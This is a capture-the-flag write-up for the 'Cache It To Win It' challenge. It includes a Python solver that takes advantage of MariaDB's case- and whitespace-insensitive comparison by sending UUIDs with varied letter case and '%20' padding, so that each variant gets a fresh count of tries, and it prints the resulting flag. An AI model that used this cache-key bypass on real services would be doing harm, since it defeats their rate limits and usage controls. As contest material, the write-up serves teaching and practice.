## Question
Are YOU today's unlucky contestant in Cache! It! To! Win! It???????

## Solution
We were given a website with a randomly generated UUID, and when clicked it shows like this.
![image](https://github.com/user-attachments/assets/3b2583a2-433f-4c48-94d6-0b0f67e96f7e)

![image](https://github.com/user-attachments/assets/0736807d-f895-4a44-a5b5-8d33d1747e57)

This used MariaDB, and MariaDB has a vuln where it doesn't check if E and e are different and renders it in lowercase.
So we use this solver script-
```python
import requests
import re

URL = "https://cache-it-to-win-it.chall.lac.tf"

uuid = "5df525de-8951-45be-bdcd-b2ac736f89cc"

while len(re.findall("-[a-f]", uuid)) < 3:
    print("UUID received:", uuid)

    uuid = requests.get(URL).cookies.get("id")

uuid = list(uuid)

for i in range(0b111 + 1):
    for idx, c_idx in enumerate([9, 19, 24]):
        if i & (0b1 << idx):
            uuid[c_idx] = uuid[c_idx].upper()
        else:
            uuid[c_idx] = uuid[c_idx].lower()
    print("".join(uuid))

    for j in range(13):
        print("URL", URL + "/check?uuid=" + "".join(uuid) + ("%20" * j))
        r = requests.get(URL + "/check?uuid=" + "".join(uuid) + ("%20" * j))
        print(r.text)
```

It bruteforces the number of tries left and we get the result - CONGRATS! YOU HAVE WON.............. A FLAG! `lactf{my_c4ch3_f41l3d!!!!!!!}`
